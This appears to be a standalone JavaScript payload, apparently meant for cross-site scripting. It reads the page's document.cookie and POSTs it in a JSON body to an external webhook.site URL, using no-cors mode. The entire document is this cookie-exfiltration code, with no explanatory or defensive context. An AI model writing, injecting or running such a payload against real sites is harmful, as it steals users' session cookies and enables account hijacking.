fetch("https://webhook.site/ceec6ac6-2ad8-4d48-823b-766a0700e17d", {
  method: 'POST',
  mode: 'no-cors',
  cache: 'no-cache',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    'cookie': document.cookie
  })
})
